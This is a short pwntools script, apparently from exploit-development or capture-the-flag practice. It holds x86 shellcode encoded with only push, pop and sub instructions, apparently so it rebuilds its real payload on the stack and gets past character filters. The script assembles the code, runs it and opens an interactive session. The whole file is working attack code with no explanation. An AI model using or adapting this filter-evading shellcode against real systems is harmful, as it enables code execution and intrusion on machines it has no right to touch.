from pwn import *



shellcode = "push esp; pop eax; sub eax, 0x32323232; sub esp, 0x76766376; sub esp, 0x57576e68; push eax; pop esp; push 0x41414141; pop eax; sub eax, 0x75757564; sub eax, 0x75757525; sub eax, 0x25646430; sub eax, 0x30712530; push eax; sub eax, 0x50505050; sub eax, 0x5050506e; sub eax, 0x54755a69; push eax; sub eax, 0x70703570; sub eax, 0x70302570; sub eax, 0x49412570; push eax; sub eax, 0x4b4b4b4b; sub eax, 0x374b4b4b; sub eax, 0x384b4b68; sub eax, 0x254e6b79; push eax; sub eax, 0x59595925; sub eax, 0x56367a44; push eax; sub eax, 0x6b6b306b; sub eax, 0x6b7a5630; sub eax, 0x797a3842; push eax; sub eax, 0x77377777; sub eax, 0x77377737; sub eax, 0x77373742; sub eax, 0x67424b33; push eax; sub eax, 0x57354257; sub eax, 0x77252557; sub eax, 0x65253070; push eax; sub eax, 0x42424242; sub eax, 0x4262424b; sub eax, 0x7a7a427a; sub eax, 0x7874387a; push eax; sub eax, 0x75616161; sub eax, 0x75616161; sub eax, 0x6f433371; push eax; sub eax, 0x34653434; sub eax, 0x65656534; sub eax, 0x666e715f; push eax; sub eax, 0x72527272; sub eax, 0x524c6566; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push esp; pop eax; jmp eax;"


bytes = asm(shellcode)
print(bytes)
print(len(bytes))
#p = gdb.debug_assembly(shellcode)
p = run_shellcode(bytes)
p.interactive()
